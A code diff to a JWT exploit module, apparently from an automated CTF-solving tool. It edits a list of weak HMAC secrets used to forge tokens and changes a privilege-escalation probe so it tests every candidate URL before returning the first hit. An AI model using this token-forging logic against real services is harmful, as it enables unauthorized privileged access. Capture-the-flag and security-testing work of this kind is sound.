@@ -19,7 +19,7 @@ class JWTModule(ExploitModule):
     # because weak HMAC keys are common CTF constructions.
     CANDIDATE_SECRETS = (
         "", "secret", "changeme", "password", "jwt", "jwtsecret", "secretkey",
-        "konoha", "konoha2026", "brunner", "brunner2026", "flag", "admin", "guest",
+        "konoha", "konoha2026", "brunner", "brunner2026", "admin", "guest",
         "test", "testing", "key", "mysecret", "supersecret", "123456", "12345678",
     )
 
@@ -140,6 +140,7 @@ class JWTModule(ExploitModule):
         return response
 
     async def _probe_mutation(self, ctx, original_token, mutated_token, label, evidence):
+        first_hit = None
         for target_url in self._candidate_urls(ctx):
             try:
                 baseline = await self._request_with_token(ctx, original_token, target_url)
@@ -158,11 +159,11 @@ class JWTModule(ExploitModule):
                     f"baseline={baseline.status_code}/{len(base_text)} "
                     f"mutated={probe.status_code}/{len(probe_text)} delta={delta}"
                 )
-                if privileged or (probe.status_code == 200 and changed and self._looks_privileged(probe_text)):
-                    return target_url, probe
+                if first_hit is None and (privileged or (probe.status_code == 200 and changed and self._looks_privileged(probe_text))):
+                    first_hit = (target_url, probe)
             except Exception as exc:
                 evidence.append(f"JWT {label}: {target_url} -> {exc}")
-        return None, None
+        return first_hit if first_hit else (None, None)
 
     async def run(self, ctx):
         tokens = self._tokens(ctx)
